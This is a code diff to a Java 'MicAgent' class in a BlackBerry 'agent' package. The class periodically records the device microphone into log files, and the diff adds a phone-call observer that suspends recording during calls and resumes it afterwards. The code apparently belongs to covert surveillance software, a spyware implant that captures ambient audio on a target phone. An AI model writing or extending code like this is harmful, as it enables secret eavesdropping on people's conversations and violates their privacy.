@@ -10,11 +10,13 @@
 package blackberry.agent;
 
 import net.rim.device.api.util.DataBuffer;
+import blackberry.AppListener;
 import blackberry.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
+import blackberry.interfaces.PhoneCallObserver;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.record.AudioRecorder;
@@ -27,7 +29,7 @@ import blackberry.utils.Utils;
 /**
  * The Class MicAgent.
  */
-public final class MicAgent extends Agent {
+public final class MicAgent extends Agent implements PhoneCallObserver {
     private static final long MIC_PERIOD = 5000;
 
     //#ifdef DEBUG
@@ -40,6 +42,9 @@ public final class MicAgent extends Agent {
 
     AudioRecorderDispatcher recorder;
     long fId;
+
+    boolean suspended = false;
+    Object suspendedLock = new Object();
 
     /**
      * Instantiates a new mic agent.
@@ -73,12 +78,37 @@ public final class MicAgent extends Agent {
         debug.info("start");
         //#endif
 
+        AppListener.getInstance().addPhoneCallObserver(this);
+        synchronized (suspendedLock) {
+            suspended = false;
+            startRecorder();
+        }
+    }
+
+    public void actualStop() {
+        //#ifdef DEBUG_INFO
+        debug.info("stop");
+        //#endif
+
+        AppListener.getInstance().removePhoneCallObserver(this);
+
+        synchronized (suspendedLock) {
+            suspended = false;
+            stopRecorder(5);
+        }
+    }
+
+    void startRecorder() {
+        //#ifdef DEBUG_TRACE
+        debug.trace("startRecorder");
+        //#endif
+
         DateTime dateTime = new DateTime();
         fId = dateTime.getFiledate();
 
         //#ifdef SAVE_AMR_FILE
-        String filename = Path.SD() + "filetest."
-                + dateTime.getOrderedString() + ".amr";
+        String filename = Path.SD() + "filetest." + dateTime.getOrderedString()
+                + ".amr";
         debug.trace("Creating file: " + filename);
         amrfile = new AutoFlashFile(filename, false);
         boolean ret = amrfile.create();
@@ -91,13 +121,38 @@ public final class MicAgent extends Agent {
         recorder.start();
     }
 
-    public void actualStop() {
-        //#ifdef DEBUG_INFO
-        debug.info("stop");
+    void stopRecorder(final int secs) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("stopRecorder");
         //#endif
 
-        if(recorder != null){
-            recorder.stop();
+        if (recorder != null) {                      
+            Runnable closure = new Runnable() {
+                public void run() {
+                    try {
+                        Thread.sleep(secs * 1000);
+                    } catch (InterruptedException e) {
+                        // TODO Auto-generated catch block
+                        e.printStackTrace();
+                    }
+                    try {
+                        if (recorder != null) {
+                            recorder.stop();
+                        }
+                    } catch (Exception ex) {
+
+                    }
+                }
+            };
+            
+            if(secs == 0){
+                recorder.stop();
+            }else{
+                //#ifdef DEBUG_TRACE
+                debug.trace("stopRecorder: waiting "+secs);
+                //#endif
+                closure.run();
+            }
         }
     }
 
@@ -131,22 +186,9 @@ public final class MicAgent extends Agent {
             //#ifdef DEBUG_TRACE
             if (offset != 0) {
                 debug.trace("offset: " + offset);
-            } else {              
+            } else {
             }
-            
-            /* Find the packet size */
-           /* int totlen = offset;
-            StringBuffer sb = new StringBuffer();
-            do {
-                int len = amr_sizes[(chunk[totlen] >> 3) & 0x0f];
-                
-                sb.append(len +"("+NumberUtilities.toString(chunk[totlen],16)+") ");
-                //debug.trace("len: " + len + " byte: " + NumberUtilities.toString(chunk[totlen],16) );
 
-                totlen += len + 1;
-            } while (totlen < chunk.length);
-            debug.trace("len: " +sb.toString());*/
-                    
             //#endif
 
             log.writeLog(chunk, offset);
@@ -195,6 +237,54 @@ public final class MicAgent extends Agent {
         setPeriod(MIC_PERIOD);
         setDelay(MIC_PERIOD);
         return true;
+    }
+
+    public void onCallAnswered(int callId, String phoneNumber) {
+    }
+
+    public void onCallConnected(int callId, String phoneNumber) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("onCallConnected");
+        //#endif
+        synchronized (suspendedLock) {
+            if (!suspended) {
+                //#ifdef DEBUG_INFO
+                debug.info("Call connected: suspending recording");
+                //#endif
+                stopRecorder(0);
+                suspended = true;
+            }
+        }
+    }
+
+    public void onCallDisconnected(int callId, String phoneNumber) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("onCallDisconnected");
+        //#endif
+        synchronized (suspendedLock) {
+            if (suspended) {
+                //#ifdef DEBUG_INFO
+                debug.info("Call disconnected: resuming recording");
+                //#endif
+                suspended = false;
+                startRecorder();
+            }
+        }
+    }
+
+    public void onCallIncoming(int callId, String phoneNumber) {
+      //#ifdef DEBUG_TRACE
+        debug.trace("onCallIncoming");
+        //#endif
+        synchronized (suspendedLock) {
+            if (!suspended) {
+                //#ifdef DEBUG_INFO
+                debug.info("Call connected: suspending recording");
+                //#endif
+                stopRecorder(0);
+                suspended = true;
+            }
+        }
     }
 
 }
